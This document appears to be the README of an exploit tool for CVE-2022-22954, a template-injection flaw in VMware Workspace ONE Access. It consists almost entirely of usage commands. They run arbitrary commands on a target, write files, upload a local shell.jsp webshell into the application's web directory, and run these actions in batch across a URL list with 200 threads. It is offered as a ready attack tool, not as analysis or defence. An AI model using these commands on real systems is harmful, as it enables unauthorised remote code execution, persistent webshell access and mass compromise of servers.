# CVE-2022-22954
CVE-2022-22954 VMware Workspace ONE Access freemarker SSTI

Multiple vulnerability trigger point detection, multi-threaded batch detection, command execution, file writing

```
// Single target vulnerability detection
python CVE-2022-22954.py -u https://x.x.x.x

// Command execution
python CVE-2022-22954.py -u https://x.x.x.x -c "id"

// Write file
python CVE-2022-22954.py -u https://x.x.x.x -fn test.jsp  -fc "test"

// Upload a file, Windows needs to specify the path to set the file name
python CVE-2022-22954.py -u https://x.x.x.x -fn test.jsp  -fp "D:\Desktop\shell.jsp"

// Upload to the specified path
python CVE-2022-22954.py -u https://x.x.x.x -fn "/opt/vmware/horizon/workspace/webapps/catalog-portal/test.jsp"  -fp "D:\Desktop\shell.jsp"

// Batch detection, consistent usage
python CVE-2022-22954.py -f url.txt
python CVE-2022-22954.py -f url.txt -c "id" -t 200
python CVE-2022-22954.py -f url.txt -fn test.jsp  -fc "test" -t 200
python CVE-2022-22954.py -f url.txt -fn test.jsp  -fp "D:\Desktop\shell.jsp" -t 200
python CVE-2022-22954.py -f url.txt -fn "/opt/vmware/horizon/workspace/webapps/catalog-portal/test.jsp"  -fp "D:\Desktop\shell.jsp" -t 200
```
